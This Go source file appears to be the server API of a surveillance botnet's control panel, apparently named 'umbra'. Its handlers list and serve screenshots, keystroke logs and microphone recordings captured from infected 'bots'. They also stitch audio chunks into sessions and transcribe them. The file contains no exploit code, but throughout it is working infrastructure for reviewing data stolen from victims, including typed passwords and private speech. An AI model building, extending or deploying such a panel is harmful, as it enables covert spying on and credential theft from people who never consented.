package api

import (
	"bytes"
	"encoding/base64"
	"errors"
	"io"
	"net/http"
	"sort"
	"strconv"
	"strings"
	"time"

	"github.com/go-chi/chi/v5"
	"github.com/google/uuid"
	"gorm.io/gorm"

	"github.com/s045pd/umbra/internal/audiocodec"
	"github.com/s045pd/umbra/internal/blobstore"
	"github.com/s045pd/umbra/internal/db/models"
	"github.com/s045pd/umbra/internal/transcribe"
)

// MediaAPI groups screenshot, keyboard log and recording routes.
type MediaAPI struct {
	DB    *gorm.DB
	Blobs interface {
		Get(kind, hash string) ([]byte, error)
	}
	Transcribe transcribe.Options
}

func parseLimitOffset(r *http.Request, defLimit int) (int, int) {
	q := r.URL.Query()
	limit, _ := strconv.Atoi(q.Get("limit"))
	if limit <= 0 || limit > 500 {
		limit = defLimit
	}
	offset, _ := strconv.Atoi(q.Get("offset"))
	if offset < 0 {
		offset = 0
	}
	return limit, offset
}

type screenshotMeta struct {
	ID         uuid.UUID `json:"ID"`
	BotID      uuid.UUID `json:"BotID"`
	URL        string    `json:"URL,omitempty"`
	Title      string    `json:"Title,omitempty"`
	Timestamp  time.Time `json:"Timestamp"`
	SessionID  string    `json:"SessionID,omitempty"`
	Difference *float64  `json:"Difference,omitempty"`
	HasImage   bool      `json:"HasImage"`
}

// Screenshots is GET /api/v1/screenshots?id=<bot_id>&limit=&offset=
func (a *MediaAPI) Screenshots(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	limit, offset := parseLimitOffset(r, 50)
	var out []screenshotMeta
	if err := a.DB.Table("bot_screenshots").
		Select("id, bot_id, url, title, timestamp, session_id, difference, ((COALESCE(image_data, '') != '') OR (COALESCE(blob_hash, '') != '')) as has_image").
		Where("bot_id = ?", id).
		Order("timestamp DESC").Limit(limit).Offset(offset).
		Find(&out).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, out)
}

// ScreenshotImage is GET /api/v1/screenshots/{id}/image
func (a *MediaAPI) ScreenshotImage(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(chi.URLParam(r, "id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	var row models.BotScreenshot
	if err := a.DB.Select("image_data", "blob_hash").Where("id = ?", id).First(&row).Error; err != nil {
		JSONErr(w, http.StatusNotFound, "screenshot not found")
		return
	}
	if row.BlobHash != "" && a.Blobs != nil {
		raw, err := a.Blobs.Get("screenshots", row.BlobHash)
		if err == nil {
			w.Header().Set("Content-Type", "image/jpeg")
			w.Header().Set("Cache-Control", "public, max-age=86400, immutable")
			_, _ = w.Write(raw)
			return
		}
	}
	img := row.ImageData
	if img == "" {
		w.WriteHeader(http.StatusNoContent)
		return
	}
	ct := "image/jpeg"
	payload := img
	if idx := strings.Index(img, ";base64,"); idx != -1 {
		prefix := img[:idx]
		ct = strings.TrimPrefix(prefix, "data:")
		payload = img[idx+len(";base64,"):]
	}
	raw, err := base64.StdEncoding.DecodeString(payload)
	if err != nil {
		w.Header().Set("Content-Type", ct)
		_, _ = w.Write([]byte(img))
		return
	}
	w.Header().Set("Content-Type", ct)
	w.Header().Set("Cache-Control", "public, max-age=86400, immutable")
	_, _ = w.Write(raw)
}

// KeyboardLogs is GET /api/v1/keyboard-logs?id=&limit=&offset=&startTime=&endTime=
func (a *MediaAPI) KeyboardLogs(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	limit, offset := parseLimitOffset(r, 50)
	tx := a.DB.Where("bot_id = ?", id)
	if v := r.URL.Query().Get("startTime"); v != "" {
		if t, err := time.Parse(time.RFC3339, v); err == nil {
			tx = tx.Where("timestamp >= ?", t)
		}
	}
	if v := r.URL.Query().Get("endTime"); v != "" {
		if t, err := time.Parse(time.RFC3339, v); err == nil {
			tx = tx.Where("timestamp <= ?", t)
		}
	}
	var rows []models.BotKeyboardLog
	if err := tx.Order("timestamp DESC").Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, rows)
}

// Recordings is GET /api/v1/recordings?id=<bot_id>
func (a *MediaAPI) Recordings(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	var rows []models.BotRecording
	if err := a.DB.Where(`"bot" = ?`, id).Order("timestamp DESC").Limit(500).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	JSONOK(w, rows)
}

type audioSession struct {
	SessionID  string    `json:"session_id"`
	StartTime  time.Time `json:"start_time"`
	EndTime    time.Time `json:"end_time"`
	ChunkCount int       `json:"chunk_count"`
	Transcript string    `json:"transcript,omitempty"`
}

const orphanSessionPrefix = "orphan-"
const orphanSessionGap = 2 * time.Minute

func recordingWhen(row models.BotRecording) time.Time {
	if row.Timestamp != nil && !row.Timestamp.IsZero() {
		return row.Timestamp.UTC()
	}
	return row.CreatedAt.UTC()
}

func orphanSessionID(first uuid.UUID) string {
	return orphanSessionPrefix + first.String()
}

func parseOrphanSession(sid string) (uuid.UUID, bool) {
	if !strings.HasPrefix(sid, orphanSessionPrefix) {
		return uuid.Nil, false
	}
	id, err := uuid.Parse(strings.TrimPrefix(sid, orphanSessionPrefix))
	if err != nil {
		return uuid.Nil, false
	}
	return id, true
}

func groupAudioSessions(rows []models.BotRecording) []audioSession {
	named := map[string][]models.BotRecording{}
	unnamed := make([]models.BotRecording, 0)
	for _, row := range rows {
		if strings.TrimSpace(row.SessionID) != "" {
			named[row.SessionID] = append(named[row.SessionID], row)
			continue
		}
		unnamed = append(unnamed, row)
	}
	sort.Slice(unnamed, func(i, j int) bool {
		return recordingWhen(unnamed[i]).Before(recordingWhen(unnamed[j]))
	})
	out := make([]audioSession, 0, len(named)+1)
	flush := func(sid string, group []models.BotRecording) {
		if len(group) == 0 {
			return
		}
		start := recordingWhen(group[0])
		end := start
		for _, r := range group[1:] {
			t := recordingWhen(r)
			if t.Before(start) {
				start = t
			}
			if t.After(end) {
				end = t
			}
		}
		out = append(out, audioSession{SessionID: sid, StartTime: start, EndTime: end, ChunkCount: len(group)})
	}
	for sid, group := range named {
		flush(sid, group)
	}
	burst := make([]models.BotRecording, 0)
	for _, row := range unnamed {
		if len(burst) > 0 && recordingWhen(row).Sub(recordingWhen(burst[len(burst)-1])) > orphanSessionGap {
			flush(orphanSessionID(burst[0].ID), burst)
			burst = burst[:0]
		}
		burst = append(burst, row)
	}
	if len(burst) > 0 {
		flush(orphanSessionID(burst[0].ID), burst)
	}
	sort.Slice(out, func(i, j int) bool { return out[i].EndTime.After(out[j].EndTime) })
	return out
}

func sniffAudioMIME(raw []byte) string {
	if len(raw) >= 4 && raw[0] == 0x1a && raw[1] == 0x45 && raw[2] == 0xdf && raw[3] == 0xa3 {
		return "audio/webm; codecs=opus"
	}
	if len(raw) >= 3 && raw[0] == 'I' && raw[1] == 'D' && raw[2] == '3' {
		return "audio/mpeg"
	}
	if len(raw) >= 2 && raw[0] == 0xff && raw[1]&0xe0 == 0xe0 {
		return "audio/mpeg"
	}
	return "application/octet-stream"
}

// AudioSessions is GET /api/v1/audio-sessions?id=<bot_id>
func (a *MediaAPI) AudioSessions(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(r.URL.Query().Get("id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	var rows []models.BotRecording
	if err := a.DB.Where(`"bot" = ?`, id).Find(&rows).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	sessions := groupAudioSessions(rows)
	ids := make([]string, 0, len(sessions))
	for _, sess := range sessions {
		if !strings.HasPrefix(sess.SessionID, orphanSessionPrefix) {
			ids = append(ids, sess.SessionID)
		}
	}
	transcripts := a.sessionTranscripts(ids)
	out := make([]audioSession, 0, len(sessions))
	for _, sess := range sessions {
		sess.Transcript = transcripts[sess.SessionID]
		out = append(out, sess)
	}
	JSONOK(w, out)
}

func (a *MediaAPI) sessionTranscripts(ids []string) map[string]string {
	out := map[string]string{}
	if len(ids) == 0 {
		return out
	}
	var texts []struct {
		SessionID string
		Text      string
		Timestamp time.Time
	}
	if err := a.DB.Model(&models.BotRecording{}).
		Select("session_id, text, timestamp").
		Where("session_id IN ? AND text <> ''", ids).
		Order("timestamp ASC").
		Find(&texts).Error; err != nil {
		return out
	}
	joined := map[string][]string{}
	for _, row := range texts {
		if t := strings.TrimSpace(row.Text); t != "" {
			joined[row.SessionID] = append(joined[row.SessionID], t)
		}
	}
	for id, parts := range joined {
		out[id] = strings.Join(parts, " ")
	}
	return out
}

func parseTime(s string) time.Time {
	for _, layout := range []string{
		time.RFC3339Nano, time.RFC3339,
		"2006-01-02 15:04:05.999999999-07:00",
		"2006-01-02 15:04:05.999999999",
		"2006-01-02 15:04:05",
	} {
		if t, err := time.Parse(layout, s); err == nil {
			return t
		}
	}
	return time.Time{}
}

// AudioSessionMerge is GET /api/v1/audio-session/{session_id}
// Concatenates MediaRecorder timeslices in timestamp order. Isolated
// clusters after the first chunk are not valid standalone WebM files.
func (a *MediaAPI) AudioSessionMerge(w http.ResponseWriter, r *http.Request) {
	sid := chi.URLParam(r, "session_id")
	if sid == "" {
		JSONErr(w, http.StatusBadRequest, "session_id required")
		return
	}
	raw, err := a.mergeSessionAudio(sid)
	if err != nil {
		JSONErr(w, http.StatusNotFound, "session not found")
		return
	}
	if len(raw) == 0 {
		JSONErr(w, http.StatusNotFound, "session audio unavailable")
		return
	}
	if sniffAudioMIME(raw) != "audio/mpeg" {
		if compacted, err := audiocodec.CompactOpus(raw); err == nil && len(compacted) > 0 {
			raw = compacted
		}
	}
	mime := sniffAudioMIME(raw)
	ext := ".webm"
	if mime == "audio/mpeg" {
		ext = ".mp3"
	}
	w.Header().Set("Content-Type", mime)
	w.Header().Set("Cache-Control", "private, max-age=60")
	w.Header().Set("Content-Disposition", `inline; filename="umbra-`+sid+ext+`"`)
	_, _ = w.Write(raw)
}

const maxMergedAudio = 64 << 20

func (a *MediaAPI) loadSessionRecordings(sessionID string) ([]models.BotRecording, error) {
	if first, ok := parseOrphanSession(sessionID); ok {
		var seed models.BotRecording
		if err := a.DB.Where("id = ?", first).First(&seed).Error; err != nil {
			return nil, err
		}
		var all []models.BotRecording
		if err := a.DB.Where(`"bot" = ? AND (session_id IS NULL OR session_id = '')`, seed.Bot).
			Find(&all).Error; err != nil {
			return nil, err
		}
		sort.Slice(all, func(i, j int) bool {
			return recordingWhen(all[i]).Before(recordingWhen(all[j]))
		})
		var burst []models.BotRecording
		flush := func() []models.BotRecording {
			if len(burst) > 0 && burst[0].ID == first {
				return burst
			}
			return nil
		}
		for _, row := range all {
			if len(burst) > 0 && recordingWhen(row).Sub(recordingWhen(burst[len(burst)-1])) > orphanSessionGap {
				if hit := flush(); hit != nil {
					return hit, nil
				}
				burst = burst[:0]
			}
			burst = append(burst, row)
		}
		if hit := flush(); hit != nil {
			return hit, nil
		}
		return nil, gorm.ErrRecordNotFound
	}
	var rows []models.BotRecording
	if err := a.DB.Where("session_id = ?", sessionID).Find(&rows).Error; err != nil {
		return nil, err
	}
	sort.Slice(rows, func(i, j int) bool {
		return recordingWhen(rows[i]).Before(recordingWhen(rows[j]))
	})
	return rows, nil
}

func (a *MediaAPI) mergeSessionAudio(sessionID string) ([]byte, error) {
	rows, err := a.loadSessionRecordings(sessionID)
	if err != nil {
		return nil, err
	}
	if len(rows) == 0 {
		return nil, gorm.ErrRecordNotFound
	}
	var buf bytes.Buffer
	for _, row := range rows {
		raw, err := a.loadAudioBytes(row)
		if err != nil || len(raw) == 0 {
			continue
		}
		if buf.Len()+len(raw) > maxMergedAudio {
			break
		}
		_, _ = buf.Write(raw)
	}
	return buf.Bytes(), nil
}

func (a *MediaAPI) loadAudioBytes(row models.BotRecording) ([]byte, error) {
	if row.BlobHash != "" && a.Blobs != nil {
		if raw, err := a.Blobs.Get("audio", row.BlobHash); err == nil && len(raw) > 0 {
			return raw, nil
		}
	}
	if row.Recording == "" {
		return nil, errors.New("empty recording")
	}
	raw, _, err := blobstore.DecodeDataURL(row.Recording)
	return raw, err
}

// AudioSessionTranscribe is POST /api/v1/audio-session/{session_id}/transcribe
func (a *MediaAPI) AudioSessionTranscribe(w http.ResponseWriter, r *http.Request) {
	sid := chi.URLParam(r, "session_id")
	if sid == "" {
		JSONErr(w, http.StatusBadRequest, "session_id required")
		return
	}
	raw, err := a.transcribeSource(r, sid)
	if err != nil || len(raw) == 0 {
		JSONErr(w, http.StatusNotFound, "session not found")
		return
	}
	text, err := transcribe.RunOptions(a.Transcribe, raw)
	if errors.Is(err, transcribe.ErrDisabled) {
		JSONErr(w, http.StatusServiceUnavailable, "transcription is not configured")
		return
	}
	if err != nil {
		JSONErr(w, http.StatusBadGateway, err.Error())
		return
	}
	rows, err := a.loadSessionRecordings(sid)
	if err != nil || len(rows) == 0 {
		JSONErr(w, http.StatusNotFound, "session not found")
		return
	}
	last := rows[len(rows)-1]
	if err := a.DB.Model(&last).Update("text", text).Error; err != nil {
		JSONErr(w, http.StatusInternalServerError, "save failed")
		return
	}
	JSONOK(w, map[string]any{"transcript": text})
}

func (a *MediaAPI) transcribeSource(r *http.Request, sid string) ([]byte, error) {
	ct := r.Header.Get("Content-Type")
	if strings.HasPrefix(ct, "multipart/") {
		if err := r.ParseMultipartForm(32 << 20); err == nil {
			f, _, err := r.FormFile("audio")
			if err == nil {
				defer f.Close()
				return io.ReadAll(f)
			}
		}
	}
	return a.mergeSessionAudio(sid)
}

type audioChunkMeta struct {
	ID        uuid.UUID `json:"id"`
	Timestamp time.Time `json:"timestamp"`
}

// AudioSessionChunks is GET /api/v1/audio-session/{session_id}/chunks
// Returns ordered chunk metadata for sequential playback.
func (a *MediaAPI) AudioSessionChunks(w http.ResponseWriter, r *http.Request) {
	sid := chi.URLParam(r, "session_id")
	if sid == "" {
		JSONErr(w, http.StatusBadRequest, "session_id required")
		return
	}
	rows, err := a.loadSessionRecordings(sid)
	if err != nil {
		JSONErr(w, http.StatusInternalServerError, "query failed")
		return
	}
	out := make([]audioChunkMeta, 0, len(rows))
	for _, row := range rows {
		out = append(out, audioChunkMeta{ID: row.ID, Timestamp: recordingWhen(row)})
	}
	JSONOK(w, out)
}

// AudioChunk is GET /api/v1/audio/{id}
// Returns a single recording row decoded from base64.
func (a *MediaAPI) AudioChunk(w http.ResponseWriter, r *http.Request) {
	id, err := uuid.Parse(chi.URLParam(r, "id"))
	if err != nil {
		JSONErr(w, http.StatusBadRequest, "invalid id")
		return
	}
	var row models.BotRecording
	if err := a.DB.Where("id = ?", id).First(&row).Error; err != nil {
		JSONErr(w, http.StatusNotFound, "recording not found")
		return
	}
	a.writeAudio(w, row)
}

func (a *MediaAPI) writeAudio(w http.ResponseWriter, row models.BotRecording) {
	raw, err := a.loadAudioBytes(row)
	if err != nil || len(raw) == 0 {
		JSONErr(w, http.StatusNotFound, "recording bytes unavailable")
		return
	}
	w.Header().Set("Content-Type", sniffAudioMIME(raw))
	w.Header().Set("Cache-Control", "public, max-age=86400, immutable")
	_, _ = w.Write(raw)
}
